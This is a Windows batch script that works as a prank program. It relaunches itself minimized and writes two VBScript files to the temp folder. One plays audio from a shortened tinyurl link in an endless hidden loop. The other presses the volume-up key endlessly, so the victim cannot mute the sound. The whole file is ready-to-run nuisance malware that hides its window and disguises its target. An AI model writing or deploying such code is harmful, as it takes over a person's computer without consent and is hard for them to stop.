if "%1" == "" start "" /min "%~dpnx0" MY_FLAG && exit
@echo off
del %tmp%\rickyou.vbs
del %tmp%\volup.vbs
cd %tmp%
echo While true > rickyou.vbs
echo Dim oPlayer >> rickyou.vbs
echo Set oPlayer = CreateObject("WMPlayer.OCX") >> rickyou.vbs
echo oPlayer.URL = "http://tinyurl.com/s63ve48" >> rickyou.vbs
echo oPlayer.controls.play >> rickyou.vbs
echo While oPlayer.playState ^<^> 1 ' 1 = Stopped >> rickyou.vbs
echo WScript.Sleep 1 >> rickyou.vbs
echo Wend >> rickyou.vbs
echo oPlayer.close >> rickyou.vbs
echo Wend >> rickyou.vbs
timeout 1
echo volup.vbs
echo do > volup.vbs
echo Set WshShell = CreateObject("WScript.Shell") >> volup.vbs
echo WshShell.SendKeys(chr(^&hAF)) >> volup.vbs
echo loop >> volup.vbs
start rickyou.vbs && volup.vbs
exit